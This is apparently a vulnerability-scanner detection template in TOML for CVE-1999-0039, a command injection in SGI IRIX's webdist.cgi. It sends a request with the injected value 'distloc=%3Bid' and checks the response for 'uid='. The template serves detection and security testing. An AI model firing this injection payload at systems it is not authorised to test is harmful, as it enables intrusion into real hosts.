[info]
author = "ave"
description = "SGI IRIX 6.3 webdist.cgi 脚本的 distloc 参数存在命令注入，通过注入分号等 shell 元字符可执行任意系统命令"
id = "POC-AVE-1999-0100"
name = "SGI IRIX webdist.cgi 命令执行检测"
severity = "high"
tags = ["ave-1999-0100"]
vuln_id = [
    "CVE-1999-0039",
    "AVE-1999-0100",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
params = "distloc=%3Bid"
path = "/{{BaseURL}}/cgi-bin/webdist.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
